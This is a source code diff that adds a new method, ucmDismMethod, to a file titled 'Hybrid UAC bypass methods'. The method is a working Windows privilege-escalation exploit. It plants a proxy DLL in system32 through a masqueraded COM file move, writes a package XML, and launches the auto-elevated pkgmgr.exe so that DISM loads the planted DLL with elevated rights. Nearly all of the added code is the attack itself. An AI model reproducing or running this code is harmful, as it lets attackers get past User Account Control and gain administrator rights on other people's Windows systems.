@@ -4,9 +4,9 @@
 *
 *  TITLE:       HYBRIDS.C
 *
-*  VERSION:     2.50
+*  VERSION:     2.51
 *
-*  DATE:        06 July 2016
+*  DATE:        10 July 2016
 *
 *  Hybrid UAC bypass methods.
 *
@@ -1293,6 +1293,66 @@ BOOL ucmSXSMethod(
         sz = 0;
         NtFreeVirtualMemory(NtCurrentProcess(), &lpSxsPath, &sz, MEM_RELEASE);
     }
+
+    return bResult;
+}
+
+/*
+* ucmDismMethod
+*
+* Purpose:
+*
+* Exploit DISM application dll loading scheme.
+*
+* Dism.exe located in system32 folder while it dlls are in system32\dism
+* When loaded dism first attempt to load dlls from system32 folder.
+*
+* Trigger: pkgmgr.exe
+* PkgMgr.exe is autoelevated whitelisted application which is actually just calling Dism.exe
+*
+*/
+BOOL ucmDismMethod(
+    PVOID ProxyDll,
+    DWORD ProxyDllSize
+    )
+{
+    BOOL    bCond = FALSE, bResult = FALSE;
+    WCHAR   szSource[MAX_PATH * 2], szDest[MAX_PATH * 2];
+
+
+    if ((ProxyDll == NULL) || (ProxyDllSize == 0))
+        return bResult;
+
+    do {
+
+        //put target dll
+        RtlSecureZeroMemory(szSource, sizeof(szSource));
+        _strcpy(szSource, g_ctx.szTempDirectory);
+        _strcat(szSource, DISMCORE_DLL);
+
+        //write proxy dll to disk
+        if (!supWriteBufferToFile(szSource, ProxyDll, ProxyDllSize)) {
+            break;
+        }
+
+        _strcpy(szDest, g_ctx.szSystemDirectory);
+        if (!ucmMasqueradedMoveFileCOM(szSource, szDest))
+            break;
+
+        _strcpy(szSource, g_ctx.szTempDirectory);
+        _strcat(szSource, PACKAGE_XML);
+
+        //write package data to disk
+        if (!supWriteBufferToFile(szSource, (PVOID)PackageData, sizeof(PackageData))) {
+            break;
+        }
+
+        _strcpy(szDest, g_ctx.szSystemDirectory);
+        _strcat(szDest, PKGMGR_EXE);
+
+        bResult = supRunProcess(szDest, TEXT("/n:%temp%\\ellocnak.xml"));
+
+    } while (bCond);
 
     return bResult;
 }
